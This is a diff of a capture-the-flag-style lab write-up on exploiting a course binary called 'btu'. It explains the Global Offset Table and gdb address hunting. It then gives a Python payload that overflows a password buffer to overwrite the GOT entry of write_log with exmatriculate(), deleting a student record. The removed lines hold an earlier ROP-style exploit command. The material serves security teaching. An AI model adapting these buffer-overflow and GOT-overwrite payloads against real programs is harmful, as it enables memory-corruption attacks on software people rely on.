@@ -97,43 +97,94 @@ the guard 's value is modified or not.
 - > x10x 0xffffabcd
 
 ### Step4: Weponize the results to exmatriculate Klaus once again
-- exmatriculate address: 
-    - > p University::exmatriculate(unsigned int)  
-    - $1 = {void (University * const, const unsigned int)} 0x804b202 <University::exmatriculate(unsigned int)>
-- exit address: 
-    > p exit 
-    - $2 = {void (int)} 0xf7b51460 <__GI_exit>
-- btu object address:
-    > p &btu
-    - $3 = (University *) 0x8050e40 <btu>
-- Klaus Id numeric value in little indean hex value: 
-    - b"\xff\x1c\x45\x6a"
+#### GOT: 
+- In order to solve this task, we need to understand **GOT**. 
+- GOT is a short for **(Global Offset Table)** which is a critical component used in programs compiled with dynamic linking. 
+- so when a program uses external functions like **print()** or **exit()** the actual address of these functions is not known at the compile time.
+- instead, the program uses the **GOT** to store the runtime-resolved addresses of these external functions. 
+- so, when the program calls an external function, it does not jump directly to that function, instead, it jumps to the address stored in the GOT entry for that function. 
+#### Example: 
 
-- last_name ROP chain is: 
-    - just after defining the Student pointer
-    ```cpp
-        // allocate a new Student record
-        Student* record = new Student;
-        record->name = new char[strlen(name)];
-        record->last_name = new char[strlen(last_name)];
+- Imagine a program that uses exit() from libc. Instead of calling exit() directly:
+
+    - The binary will contain a GOT entry for exit, say at address 0x0804a010.
+
+    - Initially, this GOT entry might point to a stub or resolver.
+
+    - After the function is resolved (by the dynamic linker), 0x0804a010 will point to the actual address of exit() in memory.
+#### Why is it important for us? 
+- because if we overwrite an entry in GOT, we can redirect the excution to the *exmatriculte()* function. 
+- and we know that we can overwrite any entry in the memory, so this should be doable.
+
+#### running the exploit
+* now lets try to apply all the theory we talked about. 
+1. we should disassemble the **University::add_student()** method: 
+    > disas University::add_student()
+2. we should check for any external function: 
+    - ![alt text](image-62.png)
+    - here we found write_log at address *0x0804a0e0*
+3. Inspecting the code of symbol *write_log()*
+    - ![alt text](image-63.png)
+    - now we can see that it jumps to the address *0x08050d30*
+    - which is the address which stores the entry of write_log() in the GOT
+    - ![alt text](image-65.png)
+4. now lets get the address of *exmatriculate()*
+    - ![alt text](image-66.png)
+    - we can see it is *0x0804b202*
+5. now I want to get a student structure located in the heap to avoid accessing invalid region. 
+    - set a breakpoint at *University::add_student*
+    - and after creating the Student object and setting up all its values, investigate it
+    - ![alt text](image-70.png)
+    - here we can see the address is *0x08057d00*
+6. now lets construct the shellcode with the addresses we got
+    1. we need to add klaus id numeric value in hex -> **0x6a451cff**
+    2. the address of write_log -> **0x08050d30**
+    3. the address in the heap -> **0x08057da0**
+    4. the address of exmatriculate -> **0x0804b202**
+7. constructing the payload:
+    - you can find the payload construction in **Buffer_Overflow/b-tu/task4_part4_payload.py**
+    ```python
+        #!/usr/bin/env python3
+
+        import subprocess
+        # build the payload of last task same as this.
+
+        # Define payload components
+        passwordBuff = b'\x61' * 32                 # 32 bytes of 'a'
+        idBuff = b'\xff\x1c\x45\x6a'                # Klaus ID
+        targetAddr = b'\x30\x0d\x05\x08'            # write_log address
+        heapAddr = b'\xa0\x7d\x05\x08'              # heap address
+
+
+
+        # Full password payload
+        passPayload = passwordBuff + idBuff + targetAddr + heapAddr
+
+        # Function to convert bytes to a Python byte-escaped string
+        def to_python_bytestr(b: bytes) -> str:
+            return ''.join(f'\\x{byte:02x}' for byte in b)
+
+        # Convert to python3-compatible command line string
+        pass_py_str = to_python_bytestr(passPayload)
+
+        # creating exmatriculate
+        exmatriculateBuff = b'\x02\xb2\x04\x08'              # 0xdeadbeef -> to be placed in the target address
+        name_py_str = to_python_bytestr(exmatriculateBuff)
+
+        # Build GDB command using python3 -c for both args
+        gdb_cmd = (
+            "gdb --args ./build/bin/btu add Abdelaziz "
+            f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{name_py_str}\")')\" "
+            " 5555 "
+            f"\"$(python3 -c 'import sys; sys.stdout.buffer.write(b\"{pass_py_str}\")')\"" 
+        )
+
+        # Print and execute
+        print("[+] Running:")
+        print(gdb_cmd)
+        subprocess.run(gdb_cmd, shell=True)
+
     ```
-    - we can excute these commands to get the address: 
-        - > p record
-        - > p *record
-        - we should see this result: 
-            - ![alt text](image-61.png)
-        - the address of lastname now is: 
-            - 0x08055d00
-
-```bash
-    gdb --args ./build/bin/btu add Abdelaziz "$(python3 -c 'import sys; sys.stdout.buffer.write(
-        b"\x02\xb2\x04\x08" +  # exmatriculate() address
-        b"\x60\x14\xb5\xf7" +  # exit() address
-        b"\x40\x0e\x05\x08" +  # this pointer (btu)
-        b"\xff\x1c\x45\x6a"    # student ID (Klaus)
-    )')" 222 "$(python3 -c 'import sys; sys.stdout.buffer.write(
-        b"\x90"*32 +           # NOP sled to fill password buffer (32 bytes)
-        b"DDDD" +              # filler for next 4 bytes after buffer (ID)
-        b"\x00\x5d\x05\x08"    # return address overwrite (points to last_name ROP chain)
-    )')"
-```
+8. run and test:
+    - ![alt text](image-71.png)
+    - here you can see that we successfully removed Klaus from the database, this imply that our exploit was successful and the task is done :), congratulations
